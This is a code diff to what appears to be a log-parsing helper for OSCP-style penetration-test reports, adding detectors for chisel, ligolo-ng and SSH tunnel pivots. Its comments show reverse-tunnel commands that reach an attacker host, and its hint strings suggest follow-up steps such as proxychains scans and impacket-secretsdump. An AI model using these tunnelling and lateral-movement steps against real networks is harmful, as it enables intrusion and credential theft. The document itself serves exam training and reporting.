@@ -9039,6 +9039,141 @@ def _multiline_passes(path, report, store):
                                          "impersonated": _imp_user,
                                          "target_spn": _target_spn}))
 
+    # iter-307: internal-pivot tunnel landing (chisel / ligolo-ng / ssh
+    # -L / -R / -D). Critical OSCP+ AD-set marker: operator has
+    # established a tunnel into an unreachable subnet, enabling lateral
+    # movement to internal hosts. Reporting requirement: exam report
+    # MUST document every pivot with source→destination host mapping.
+    #
+    # Chisel server (attacker side):
+    #   $ ./chisel server -p 8080 --reverse
+    #   2024/01/15 15:15:22 server: Listening on http://0.0.0.0:8080
+    # Chisel client (compromised host side, reverse tunnel):
+    #   $ ./chisel client 10.10.14.5:8080 R:socks
+    #   2024/01/15 15:15:23 client: Connecting to ws://10.10.14.5:8080
+    #   2024/01/15 15:15:23 client: Connected (Latency 12ms)
+    #
+    # Ligolo-ng proxy (attacker side):
+    #   INFO[0000] Listening on 0.0.0.0:11601
+    #   INFO[0142] Agent joined.       name=WEB01.corp.local remote=10.10.14.5:44210
+    # Ligolo agent (compromised host):
+    #   [Agent] : Connection established
+    #
+    # SSH port-forward captured (.bash_history / shell log):
+    #   ssh -L 8080:10.20.30.40:80 user@jumphost
+    #   ssh -R 4444:127.0.0.1:4444 user@attacker
+    #   ssh -D 9050 user@jumphost
+    _CHISEL_SERVER = re.compile(
+        r'(?im)^[^\r\n]{0,80}\bserver\s*:\s*Listening\s+on\s+'
+        r'(https?://[^\s\r\n]{4,120})')
+    _CHISEL_CLIENT = re.compile(
+        r'(?im)^[^\r\n]{0,80}\bclient\s*:\s*'
+        r'(?:session#\d+\s*:\s*)?Connected(?:\s*\(Latency\s+\d+ms\))?')
+    _LIGOLO_AGENT_JOIN = re.compile(
+        r'(?im)^[^\r\n]{0,80}Agent\s+joined\.?\s+'
+        r'name\s*=\s*([\w.\-]{2,80})\s+remote\s*=\s*'
+        r'([0-9a-f:.]{7,45}(?::\d{1,5})?)')
+    _LIGOLO_LISTEN = re.compile(
+        r'(?im)^[^\r\n]{0,80}Listening\s+on\s+([0-9.]{7,15}:\d{2,5})')
+    _SSH_LFORWARD = re.compile(
+        r'(?im)\bssh\s+(?:-\w+\s+)*(-[LRD])\s+'
+        r'(\d{2,5}(?::[\w.\-]{2,80}:\d{2,5})?)\s+[^\r\n]{1,120}')
+    if not filters.is_doc_file(path):
+        _pivot_seen = set()
+        # Chisel server (attacker declares listener)
+        for _cs in _CHISEL_SERVER.finditer(text[:65536]):
+            _url = _cs.group(1)
+            _sig = ("chisel-srv", _url.lower())
+            if _sig in _pivot_seen:
+                continue
+            _pivot_seen.add(_sig)
+            report.add("HIGH", "PIVOT", path, _ln(_cs),
+                       f"Chisel server listening on {_url} - pivot "
+                       f"tunnel endpoint established",
+                       hint=(f"attacker-side chisel listener  |  "
+                             f"compromised host connects with: "
+                             f"chisel client <attacker>:<port> R:socks"
+                             f"  |  post-connect: proxychains nmap "
+                             f"<internal-cidr>  |  document in report:"
+                             f" pivot from <YOUR-IP> to internal "
+                             f"subnet via chisel"))
+            if store is not None:
+                store.add(Evidence(kind="pivot_landed",
+                                   source=path, line=_ln(_cs),
+                                   meta={"tool": "chisel",
+                                         "role": "server",
+                                         "endpoint": _url}))
+        # Chisel client Connected
+        for _cc in _CHISEL_CLIENT.finditer(text[:65536]):
+            _sig = ("chisel-cli", _cc.start() // 200)  # cluster by position
+            if _sig in _pivot_seen:
+                continue
+            _pivot_seen.add(_sig)
+            report.add("HIGH", "PIVOT", path, _ln(_cc),
+                       f"Chisel client CONNECTED - reverse tunnel "
+                       f"active into internal network",
+                       hint=(f"tunnel is up  |  set up socks proxy in"
+                             f" /etc/proxychains.conf then "
+                             f"proxychains nmap <internal-cidr>  |  "
+                             f"pivoted lateral: proxychains "
+                             f"impacket-secretsdump ..."))
+            if store is not None:
+                store.add(Evidence(kind="pivot_landed",
+                                   source=path, line=_ln(_cc),
+                                   meta={"tool": "chisel",
+                                         "role": "client",
+                                         "status": "connected"}))
+        # Ligolo-ng Agent joined (proxy side, most valuable)
+        for _lj in _LIGOLO_AGENT_JOIN.finditer(text[:65536]):
+            _agent_name = _lj.group(1).strip()
+            _agent_remote = _lj.group(2).strip()
+            _sig = ("ligolo-join", _agent_name.lower())
+            if _sig in _pivot_seen:
+                continue
+            _pivot_seen.add(_sig)
+            report.add("HIGH", "PIVOT", path, _ln(_lj),
+                       f"Ligolo-ng agent JOINED: {_agent_name} from "
+                       f"{_agent_remote} - pivot tunnel active",
+                       hint=(f"agent '{_agent_name}' is the pivot "
+                             f"host  |  ligolo session: > session "
+                             f"1; then > start --tun ligolo  |  "
+                             f"ip route add <internal-cidr> dev "
+                             f"ligolo  |  now nmap directly (no "
+                             f"proxychains needed - kernel-level "
+                             f"routing)"))
+            if store is not None:
+                store.add(Evidence(kind="pivot_landed",
+                                   host=_agent_name,
+                                   source=path, line=_ln(_lj),
+                                   meta={"tool": "ligolo-ng",
+                                         "role": "proxy",
+                                         "agent_remote": _agent_remote}))
+        # SSH port-forward flag captured (from history/logs)
+        for _sf in _SSH_LFORWARD.finditer(text[:65536]):
+            _flag = _sf.group(1)
+            _spec = _sf.group(2)
+            _sig = ("ssh-fwd", _flag, _spec)
+            if _sig in _pivot_seen:
+                continue
+            _pivot_seen.add(_sig)
+            _mode = {"-L": "local-forward",
+                     "-R": "reverse-forward",
+                     "-D": "SOCKS-proxy"}.get(_flag, "forward")
+            report.add("MEDIUM", "PIVOT", path, _ln(_sf),
+                       f"SSH {_flag} {_mode}: {_spec} - port-forward"
+                       f" tunnel command captured",
+                       hint=(f"OSCP+ SSH-tunnel pivot  |  {_flag} "
+                             f"{_spec}  |  document in report: pivot"
+                             f" via SSH from source host to internal"
+                             f" service"))
+            if store is not None:
+                store.add(Evidence(kind="pivot_landed",
+                                   source=path, line=_ln(_sf),
+                                   meta={"tool": "ssh",
+                                         "flag": _flag,
+                                         "spec": _spec,
+                                         "mode": _mode}))
+
     # iter-279: PowerView `Get-DomainComputer -Unconstrained | fl` output.
     # `TRUSTED_FOR_DELEGATION` in userAccountControl = unconstrained
     # Kerberos delegation. On DCs it's by design (SERVER_TRUST_ACCOUNT)
